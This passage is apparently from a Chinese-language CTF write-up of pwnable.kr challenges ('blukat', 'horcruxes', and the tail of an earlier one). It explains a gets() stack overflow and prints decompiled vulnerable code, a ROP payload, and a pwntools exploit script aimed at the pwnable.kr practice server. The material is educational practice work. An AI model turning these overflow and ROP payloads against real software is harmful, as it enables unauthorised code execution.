</span></span></code></pre></td></tr></table></div></div><p>根据刚才得到的栈上关系，<code>ebp-0x8 = stack address leak + 0xc</code>，因此第二种方法的 payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>shell_addr</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>12</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>stack_leak</span><span class=o>+</span><span class=mh>0xc</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>heap_leak</span><span class=o>+</span><span class=mh>0xc</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=blukat>blukat</h2><p>这题只有三分，但是代码中并没有什么可利用的点：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>char</span> <span class=n>flag</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>password</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=kt>char</span><span class=o>*</span> <span class=n>key</span> <span class=o>=</span> <span class=s>&#34;3</span><span class=se>\r</span><span class=s>G[S/%</span><span class=se>\x1c\x1d</span><span class=s>#0?</span><span class=se>\r</span><span class=s>IS</span><span class=se>\x0f\x1c\x1d\x18</span><span class=s>;,4</span><span class=se>\x1b\x00\x1b</span><span class=s>p;5</span><span class=se>\x0b\x1b\x08\x45</span><span class=s>+&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>calc_flag</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>s</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=n>strlen</span><span class=p>(</span><span class=n>s</span><span class=p>);</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=n>flag</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=n>key</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>	<span class=n>FILE</span><span class=o>*</span> <span class=n>fp</span> <span class=o>=</span> <span class=n>fopen</span><span class=p>(</span><span class=s>&#34;/home/blukat/password&#34;</span><span class=p>,</span> <span class=s>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fgets</span><span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=mi>100</span><span class=p>,</span> <span class=n>fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;guess the password!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=n>strcmp</span><span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=n>buf</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;congrats! here is your flag:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>calc_flag</span><span class=p>(</span><span class=n>password</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;wrong guess!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里就是要求输入 <code>password</code> 并和同目录的 <code>password</code> 文件比对，相同则输出 flag。直接 <code>cat password</code>，显示无权限：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat: password: Permission denied
</span></span></code></pre></td></tr></table></div></div><p>由于没有可利用的点并且分很低，结合提示可以想到不是常规思路能解决的题。注意到 <code>blukat.c</code> 这个程序明显是可以读 <code>password</code> 文件的，我们可以查看一下该文件的权限：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ls -al
</span></span><span class=line><span class=cl>total <span class=m>36</span>
</span></span><span class=line><span class=cl>drwxr-x---   <span class=m>4</span> root blukat     <span class=m>4096</span> Aug <span class=m>16</span>  <span class=m>2018</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>114</span> root root       <span class=m>4096</span> May <span class=m>19</span> 15:59 ..
</span></span><span class=line><span class=cl>-r-xr-sr-x   <span class=m>1</span> root blukat_pwn <span class=m>9144</span> Aug  <span class=m>8</span>  <span class=m>2018</span> blukat
</span></span><span class=line><span class=cl>-rw-r--r--   <span class=m>1</span> root root        <span class=m>645</span> Aug  <span class=m>8</span>  <span class=m>2018</span> blukat.c
</span></span><span class=line><span class=cl>dr-xr-xr-x   <span class=m>2</span> root root       <span class=m>4096</span> Aug <span class=m>16</span>  <span class=m>2018</span> .irssi
</span></span><span class=line><span class=cl>-rw-r-----   <span class=m>1</span> root blukat_pwn   <span class=m>33</span> Jan  <span class=m>6</span>  <span class=m>2017</span> password
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root       <span class=m>4096</span> Aug <span class=m>16</span>  <span class=m>2018</span> .pwntools-cache
</span></span></code></pre></td></tr></table></div></div><p>需要是 <code>blukat_pwn</code> 组的用户才能够读，那么我们是以什么用户登录的呢？</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1104<span class=o>(</span>blukat<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1104<span class=o>(</span>blukat<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1104<span class=o>(</span>blukat<span class=o>)</span>,1105<span class=o>(</span>blukat_pwn<span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到我们确实是属于 <code>blukat_pwn</code> 组的，但是却提示无权读取，那么只有一种可能，就是 <code>password</code> 文件本身的内容就是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cat: password: Permission denied
</span></span></code></pre></td></tr></table></div></div><p>输入进程序就能得到 flag。</p><h2 id=horcruxes>horcruxes</h2><p>IDA 一下 <code>ropme</code> 函数：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>ropme</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>s</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span> <span class=c1>// [esp+4h] [ebp-74h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// [esp+68h] [ebp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>fd</span><span class=p>;</span> <span class=c1>// [esp+6Ch] [ebp-Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Select Menu:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>getchar</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>v2</span> <span class=o>==</span> <span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>A</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>v2</span> <span class=o>==</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>B</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>v2</span> <span class=o>==</span> <span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>C</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>v2</span> <span class=o>==</span> <span class=n>d</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>D</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>v2</span> <span class=o>==</span> <span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>E</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>v2</span> <span class=o>==</span> <span class=n>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>F</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>v2</span> <span class=o>==</span> <span class=n>g</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>G</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;How many EXP did you earned? :&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>gets</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>atoi</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=o>==</span> <span class=n>sum</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;flag&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>s</span><span class=p>[</span><span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=mh>0x64u</span><span class=p>)]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>puts</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;You&#39;d better get more experience to kill Voldemort&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>显然最后一个 <code>else</code> 部分的 <code>gets</code> 可以导致栈溢出，但是程序开启了 NX 使得无法在栈上执行 <code>shellcode</code>，根据题目提示，这题我们需要利用 ROP 技术找到 7 个 <code>gadgets</code>，最终劫持返回地址。</p><p>根据 IDA 提示，<code>s</code> 位于 <code>ebp-0x74</code> 与返回地址相差 <code>0x74+0x4=0x78</code>。注意到 <code>ropme</code> 函数的地址 <code>0x080a0009</code> 中含有 <code>0a</code> 这个截断字符，因此我们不可能将其中的地址写到栈上，也就是说不能绕过 <code>if (atoi(s) == sum )</code> 直接去读 flag。那我们就需要找到 <code>sum</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>int</span> <span class=nf>init_ABCDEFG</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>v0</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>buf</span><span class=p>;</span> <span class=c1>// [esp+8h] [ebp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>fd</span><span class=p>;</span> <span class=c1>// [esp+Ch] [ebp-Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/urandom&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=mi>4u</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>4</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;/dev/urandom error&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>srand</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>a</span> <span class=o>=</span> <span class=o>-</span><span class=mi>559038737</span> <span class=o>*</span> <span class=n>rand</span><span class=p>()</span> <span class=o>%</span> <span class=mh>0xCAFEBABE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>b</span> <span class=o>=</span> <span class=o>-</span><span class=mi>559038737</span> <span class=o>*</span> <span class=n>rand</span><span class=p>()</span> <span class=o>%</span> <span class=mh>0xCAFEBABE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>c</span> <span class=o>=</span> <span class=o>-</span><span class=mi>559038737</span> <span class=o>*</span> <span class=n>rand</span><span class=p>()</span> <span class=o>%</span> <span class=mh>0xCAFEBABE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>d</span> <span class=o>=</span> <span class=o>-</span><span class=mi>559038737</span> <span class=o>*</span> <span class=n>rand</span><span class=p>()</span> <span class=o>%</span> <span class=mh>0xCAFEBABE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>e</span> <span class=o>=</span> <span class=o>-</span><span class=mi>559038737</span> <span class=o>*</span> <span class=n>rand</span><span class=p>()</span> <span class=o>%</span> <span class=mh>0xCAFEBABE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>f</span> <span class=o>=</span> <span class=o>-</span><span class=mi>559038737</span> <span class=o>*</span> <span class=n>rand</span><span class=p>()</span> <span class=o>%</span> <span class=mh>0xCAFEBABE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v0</span> <span class=o>=</span> <span class=n>rand</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>g</span> <span class=o>=</span> <span class=o>-</span><span class=mi>559038737</span> <span class=o>*</span> <span class=n>v0</span> <span class=o>%</span> <span class=mh>0xCAFEBABE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=n>f</span> <span class=o>+</span> <span class=n>e</span> <span class=o>+</span> <span class=n>d</span> <span class=o>+</span> <span class=n>c</span> <span class=o>+</span> <span class=n>b</span> <span class=o>+</span> <span class=n>a</span> <span class=o>+</span> <span class=o>-</span><span class=mi>559038737</span> <span class=o>*</span> <span class=n>v0</span> <span class=o>%</span> <span class=mh>0xCAFEBABE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>sum</span> <span class=o>=</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>由于调用了 <code>srand</code>，我们无法预测 <code>abcdefg</code> 的值，但是我们又需要它们的值才能计算出 <code>sum</code>。幸运的是，在 <code>ropme</code> 函数中刚才被我们忽略的上面的一大串 <code>if</code> 语句能带来一些帮助。当输入的 <code>v2</code> 等于这些随机数中的任一个时，就会执行相应的大写字母作为名字的函数，而这些函数会将随机数本身打印出来，这样我们就能拿到 7 个随机数的值了，相加就能得到 <code>sum</code>。</p><p>我们从 IDA 中拿到 7 个函数的地址，前面先填充 <code>0x78</code> 字节，随后依次追加 7 个函数的地址，那么一个函数返回后就会返回到下一个函数的入口上，构成 ROP 链，最后再返回 <code>ropme</code> 计算 <code>sum</code>。然而前面提到 <code>ropme</code> 地址无法写到栈上，但我们可以利用 <code>main</code> 函数中 <code>call ropme</code> 所在地址 <code>0x0809fffc</code>，来返回到 <code>ropme</code>。</p><p>因此，最终 payload 为：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;pwnable.kr&#39;</span><span class=p>,</span> <span class=mi>9032</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x78</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0809fe4b</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0809fe6a</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0809fe89</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0809fea8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0809fec7</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0809fee6</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0809ff05</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0809fffc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>sum</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;+&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nb>sum</span> <span class=o>+=</span> <span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>2</span><span class=p>])</span> <span class=c1># strip )\n</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=nb>sum</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
